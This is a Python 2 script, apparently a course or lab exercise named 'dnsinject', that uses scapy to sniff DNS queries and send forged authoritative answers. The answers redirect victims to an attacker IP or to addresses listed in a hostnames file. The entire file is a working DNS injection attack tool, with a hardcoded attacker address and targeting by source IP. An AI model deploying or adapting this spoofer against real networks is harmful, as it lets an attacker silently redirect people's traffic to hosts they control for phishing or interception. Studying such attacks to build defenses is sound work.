#!/usr/bin/env python
import argparse
import logging
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)
import os
from scapy.all import *
import sys

def dns_spoof(pkt):
    flag1=0
    flag2=0
    flag3=0
    if expression is None or len(expression) == 0:
        print "bpf expression is null"
        flag3=1
    elif pkt[IP].src in expression > 0 : #can check other fields too here
        print "victim ip found in bpf filter"
        flag3=1
    if(flag3==1):
        print "expression is null or it has src ip"
        if pkt.haslayer(DNSQR): # DNS question record
            # search for pkt[DNSQR].qname in file
            victim = pkt[DNSQR].qname
            if hostname is None:
                print "filename not entered, using attacker ip as forged response"
                redirect_to = '192.168.217.129'
                flag1=1
            else:
                with open(hostname) as fp:
                    for line in fp:
                        print line
                        if victim.rstrip('.') in line:
                            flag2=1
                            mylist = line.split(" ")
                            redirect_to = mylist[0]
            if flag1 == 1 or flag2 == 1:
                spoofed_pkt = IP(dst=pkt[IP].src, src=pkt[IP].dst)/\
                              UDP(dport=pkt[UDP].sport, sport=pkt[UDP].dport)/\
                              DNS(id=pkt[DNS].id, qd=pkt[DNS].qd, aa = 1, qr=1, \
                              an=DNSRR(rrname=pkt[DNS].qd.qname,  ttl=10, rdata=redirect_to))
                send(spoofed_pkt)
                print 'Sent packet', spoofed_pkt.summary()


def cli_parser():
    parser = argparse.ArgumentParser(
        add_help=False,
        description="dnsinject is a tool to make MOTS DNS injection attacks")
    parser.add_argument(
        "-i", metavar="eth0")
    parser.add_argument(
        "-f", metavar ="192.168.217.129")
    parser.add_argument(
        '-h', '-?', '--h', '-help', '--help', action="store_true",
        help=argparse.SUPPRESS)
    parser.add_argument('expression', nargs='*',action="store")
    args = parser.parse_args()

    if args.h:
        parser.print_help()
        sys.exit()

    return args.i, args.f, args.expression



def title():
    print "DNS injector"
    return


if __name__ == '__main__':
    interface, hostname ,expression= cli_parser()
    try:
        if interface:
            print interface
            flag =1
        else:
            print "Capture on all interfaces"
            flag =0
        if hostname:
            print hostname
        if expression:
            print expression
        if flag==1:
            sniff(filter='udp port 53', iface=interface, store=0, prn=dns_spoof)
        else:
            sniff(filter='udp port 53', store=0, prn=dns_spoof)
            

    except AttributeError:
        os.system('clear')
        title()
        print "Invalid entry/entries"
        print "dnsinject [-i interface] [-f hostnames] expression"
